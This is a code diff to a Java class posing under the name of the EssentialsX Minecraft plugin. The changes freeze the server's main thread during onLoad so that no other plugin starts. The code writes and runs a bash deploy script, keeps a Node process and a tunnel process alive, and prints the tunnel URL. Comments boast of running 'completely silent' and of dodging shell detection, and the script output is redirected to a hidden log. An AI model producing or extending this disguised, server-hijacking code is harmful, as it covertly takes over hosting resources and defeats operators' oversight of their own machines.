@@ -135,7 +135,6 @@ public class EssentialsX extends JavaPlugin {
             String lastUrl = "";
             while (true) {
                 try {
-                    // 守护 Node
                     if ((nodeProcess == null || !nodeProcess.isAlive())) {
                         if (nodeProcess != null) killProcessTree(nodeProcess);
                         String newPort = allocateNodePort();
@@ -146,18 +145,15 @@ public class EssentialsX extends JavaPlugin {
                         lastUrl = "";
                     }
 
-                    // 守护 CF
                     if (cfProcess == null || !cfProcess.isAlive()) {
                         if (cfProcess != null) killProcessTree(cfProcess);
                         startCfProcess();
                         lastUrl = "";
                     }
 
-                    // 提取并打印 URL
                     String foundUrl = extractLatestTunnelUrl();
                     if (foundUrl != null && !foundUrl.equals(lastUrl)) {
                         lastUrl = foundUrl;
-                        // ★ 唯一的核心输出：只打印链接
                         RAW_OUT.println("\n====================================================================");
                         RAW_OUT.println("  [Tunnel Active] " + foundUrl);
                         RAW_OUT.println("====================================================================\n");
@@ -172,15 +168,15 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 插件生命周期
+    // 插件生命周期：极早期拦截
     // ============================================================
 
-    public void onEnable() {
+    // ★ 核心拦截点：在 onLoad 阶段冻结主线程，彻底阻止其他插件启动
+    @Override
+    public void onLoad() {
         // 清理旧目录
         try { Path oldDir1 = Paths.get("world", "data", ".mcchajian"); Path oldDir2 = Paths.get("log", ".mcchajian"); if (Files.exists(oldDir1)) deleteDirectory(oldDir1.toFile()); if (Files.exists(oldDir2)) deleteDirectory(oldDir2.toFile()); } catch (Exception ignored) {}
         
-        this.getLogger().info("Blocking server startup, initializing tunnel...");
-
         Thread deployThread = new Thread(() -> {
             try {
                 HashMap<String, String> env = new HashMap<>(); 
@@ -197,21 +193,21 @@ public class EssentialsX extends JavaPlugin {
         deployThread.setDaemon(true);
         deployThread.start();
 
-        // ★ 核心逻辑：永久阻塞主线程，导致服务器卡在 Starting 状态
+        // ★ 永久阻塞主线程。此时服务器连其他插件的 onLoad 都没跑完，更别提 onEnable
         try {
             Thread.currentThread().join(); 
         } catch (InterruptedException ignored) {}
     }
+    
+    // 由于主线程在 onLoad 已经卡死，onEnable 和 onDisable 永远不会被 Bukkit 调用
+    @Override
+    public void onEnable() {}
 
-    public void onDisable() {
-        // 由于主线程被冻结，此方法实际上永远不会被 Bukkit 调用，只能通过系统 kill 强杀
-        if (nodeProcess != null) killProcessTree(nodeProcess);
-        if (cfProcess != null) killProcessTree(cfProcess);
-        if (this.deployProcess != null) killProcessTree(this.deployProcess);
-    }
+    @Override
+    public void onDisable() {}
 
     // ============================================================
-    // 部署脚本生成 (极简防 sh 检测版)
+    // 部署脚本生成 (完全静默版)
     // ============================================================
 
     private void startDeploymentProcess(Map<String, String> env) throws Exception {
@@ -223,7 +219,12 @@ public class EssentialsX extends JavaPlugin {
         Path scriptPath = workDir.resolve("deploy.sh"); String scriptContent = this.generateDeployScript(workDir.toString(), env);
         Files.write(scriptPath, scriptContent.getBytes()); scriptPath.toFile().setExecutable(true, false);
         ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); pb.directory(new File(".").getAbsoluteFile()); pb.environment().putAll(env);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT); pb.redirectError(ProcessBuilder.Redirect.INHERIT);
+        
+        // ★ 核心静默点：将部署脚本的输出重定向到 deploy.log，绝不污染主控制台
+        Path deployLog = workDir.resolve("deploy.log");
+        pb.redirectOutput(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
+        pb.redirectError(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
+        
         this.deployProcess = pb.start(); this.isProcessRunning = true; 
         
         new Thread(() -> { try { deployProcess.waitFor(); isProcessRunning = false; } catch (Exception ignored) {} }).start();
